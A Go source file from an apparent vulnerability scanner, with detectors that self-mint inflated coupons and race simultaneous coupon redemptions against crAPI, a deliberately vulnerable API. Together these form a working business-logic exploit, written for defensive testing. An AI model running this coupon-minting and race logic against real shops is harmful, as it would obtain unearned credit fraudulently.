package businesslogic

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"strings"

	"github.com/tuangatech/hacker-five/pkg/detectors"
)

// checkCouponSelfMintCredit mints a fresh coupon with an inflated amount,
// then applies it — a real response that reflects the injected amount as
// added credit is the finding. Deterministic: once the server confirms it
// added exactly the amount HackerFive itself chose, there's no ambiguity to
// triage, same "PoC required for high confidence" discipline every other
// detector's high-confidence findings already use.
func (d *Detector) checkCouponSelfMintCredit(ctx context.Context, target, host, authToken string) ([]detectors.Finding, error) {
	if authToken == "" {
		return nil, nil
	}
	code := "hf-blf-" + randomHex(8)
	mintBody := fmt.Sprintf(`{"coupon_code":%q,"amount":%q}`, code, injectedCreditAmount)

	mintReq, mintResp, mintRespBody, err := d.doJSONRequest(ctx, http.MethodPost, target, host, d.couponMintPath, authToken, mintBody)
	if err != nil {
		return nil, nil // mint failed — nothing to apply, not a detector error
	}
	if mintResp.StatusCode != http.StatusOK {
		return nil, nil // target may not have this endpoint at all, or rejected it — no finding
	}

	applyBody := fmt.Sprintf(`{"coupon_code":%q,"amount":%s}`, code, injectedCreditAmount)
	applyReq, applyResp, applyRespBody, err := d.doJSONRequest(ctx, http.MethodPost, target, host, d.couponApplyPath, authToken, applyBody)
	if err != nil {
		return nil, nil
	}
	if applyResp.StatusCode != http.StatusOK || !responseGrantedAmount(applyRespBody, injectedCreditAmount) {
		return nil, nil
	}

	return []detectors.Finding{{
		ID:          "businesslogic-coupon-self-mint-credit",
		Type:        "businesslogic",
		Severity:    "critical",
		Confidence:  "high",
		Target:      target + d.couponApplyPath,
		Description: fmt.Sprintf("self-minted coupon %q (amount %s, no admin/role check on %s) was accepted by %s and added real, unearned credit — the apply endpoint never cross-checks the client-supplied amount against the coupon's real stored value", code, injectedCreditAmount, d.couponMintPath, d.couponApplyPath),
		Evidence: map[string]string{
			"coupon_code":    code,
			"mint_request":   detectors.FormatRequest(mintReq.Method, mintReq.URL.String(), mintReq.Header, []byte(mintBody)),
			"mint_response":  detectors.FormatResponse(mintResp.StatusCode, mintResp.Header, mintRespBody),
			"apply_request":  detectors.FormatRequest(applyReq.Method, applyReq.URL.String(), applyReq.Header, []byte(applyBody)),
			"apply_response": detectors.FormatResponse(applyResp.StatusCode, applyResp.Header, applyRespBody),
		},
	}}, nil
}

// checkCouponApplyRace mints a second, independent coupon (kept separate
// from checkCouponSelfMintCredit's so the two checks stay order-independent),
// then fires raceConcurrency simultaneous apply requests for that one coupon
// via the last-byte-sync race client (raceclient.go). More than one
// successful apply for what should be a single-use coupon is a deterministic,
// count-based finding — no manual triage needed once the count is known.
func (d *Detector) checkCouponApplyRace(ctx context.Context, target, host, authToken string) ([]detectors.Finding, error) {
	if authToken == "" {
		return nil, nil
	}
	code := "hf-blf-race-" + randomHex(8)
	mintBody := fmt.Sprintf(`{"coupon_code":%q,"amount":%q}`, code, injectedCreditAmount)

	_, mintResp, _, err := d.doJSONRequest(ctx, http.MethodPost, target, host, d.couponMintPath, authToken, mintBody)
	if err != nil || mintResp.StatusCode != http.StatusOK {
		return nil, nil
	}

	applyBody := []byte(fmt.Sprintf(`{"coupon_code":%q,"amount":%s}`, code, injectedCreditAmount))
	results, err := fireRace(ctx, target, d.couponApplyPath, raceRequestOptions{
		Method: http.MethodPost,
		Headers: map[string]string{
			d.authHeaderName: strings.Replace(d.authHeaderFormat, "{token}", authToken, 1),
			"Content-Type":   "application/json",
		},
		Body:     applyBody,
		Insecure: d.insecure,
	}, d.raceConcurrency)
	if err != nil {
		return nil, nil // raw-conn race couldn't even fire — network/target issue, not a detector error
	}

	successes := 0
	var sample raceResponse
	for _, r := range results {
		if r.Err == nil && r.StatusCode == http.StatusOK {
			successes++
			sample = r
		}
	}
	if successes < 2 {
		return nil, nil
	}

	return []detectors.Finding{{
		ID:          "businesslogic-coupon-apply-race",
		Type:        "businesslogic",
		Severity:    "high",
		Confidence:  "high",
		Target:      target + d.couponApplyPath,
		Description: fmt.Sprintf("%d of %d simultaneous apply requests for the same single-use coupon %q succeeded (expected at most 1) — check-then-act race condition, no transaction/locking around the single-use enforcement", successes, d.raceConcurrency, code),
		Evidence: map[string]string{
			"coupon_code":        code,
			"concurrency":        strconv.Itoa(d.raceConcurrency),
			"successful_applies": strconv.Itoa(successes),
			"race_request_body":  string(applyBody),
			"sample_response":    detectors.FormatResponse(sample.StatusCode, sample.Header, sample.Body),
		},
	}}, nil
}

// responseGrantedAmount reports whether body looks like crAPI's real
// apply-coupon success shape (a JSON object with a numeric "credit" field)
// AND that field's value is close to injectedAmount — not just present.
// Exact equality would miss the real shape (live-confirmed 2026-08-29: an
// account's real credit balance is its pre-existing balance *plus* the
// injected amount, e.g. "1000099.0" for a ~100 baseline + 999999 injected,
// never exactly "999999"), but a bare presence check would flag any
// successful apply at all, including a server that correctly ignores the
// client-supplied amount and grants its own small, legitimate value — a real
// false-positive risk caught before this shipped. A threshold well below the
// injected amount (90%) distinguishes "the server added roughly what was
// injected" from "the server added something else entirely," without
// requiring exact-match precision this project's own live evidence shows
// doesn't hold. Hardcoded to crAPI's real response shape, not generic — this
// check is explicitly crAPI-shaped per
// docs/13-implementation-plan-ph4.md Step 3's "hardcode patterns for known
// apps" scoping, same as its coupon paths.
func responseGrantedAmount(body []byte, injectedAmount string) bool {
	var parsed struct {
		Credit json.Number `json:"credit"`
	}
	if err := json.Unmarshal(body, &parsed); err != nil || parsed.Credit == "" {
		return false
	}
	credit, err := parsed.Credit.Float64()
	if err != nil {
		return false
	}
	injected, err := strconv.ParseFloat(injectedAmount, 64)
	if err != nil {
		return false
	}
	return credit >= injected*0.9
}

// doJSONRequest fires one JSON-body request and records the outcome against
// hostErrors. Mirrors authbypass.Detector.doRequestBody's shape.
func (d *Detector) doJSONRequest(ctx context.Context, method, target, host, path, token, body string) (*http.Request, *http.Response, []byte, error) {
	req, err := http.NewRequestWithContext(ctx, method, target+path, strings.NewReader(body))
	if err != nil {
		return nil, nil, nil, fmt.Errorf("businesslogic: building request: %w", err)
	}
	if token != "" {
		req.Header.Set(d.authHeaderName, strings.Replace(d.authHeaderFormat, "{token}", token, 1))
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := d.client.Do(req)
	if err != nil {
		d.hostErrors.RecordError(host)
		return nil, nil, nil, fmt.Errorf("businesslogic: fetching %s: %w", target+path, err)
	}
	defer func() { _ = resp.Body.Close() }()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		d.hostErrors.RecordError(host)
		return nil, nil, nil, fmt.Errorf("businesslogic: reading response body: %w", err)
	}
	d.hostErrors.RecordSuccess(host)
	return req, resp, respBody, nil
}

// randomHex returns n hex characters of crypto/rand-sourced randomness, used
// to build a coupon_code HackerFive itself controls end-to-end.
func randomHex(n int) string {
	b := make([]byte, (n+1)/2)
	_, _ = rand.Read(b)
	s := hex.EncodeToString(b)
	if len(s) > n {
		s = s[:n]
	}
	return s
}
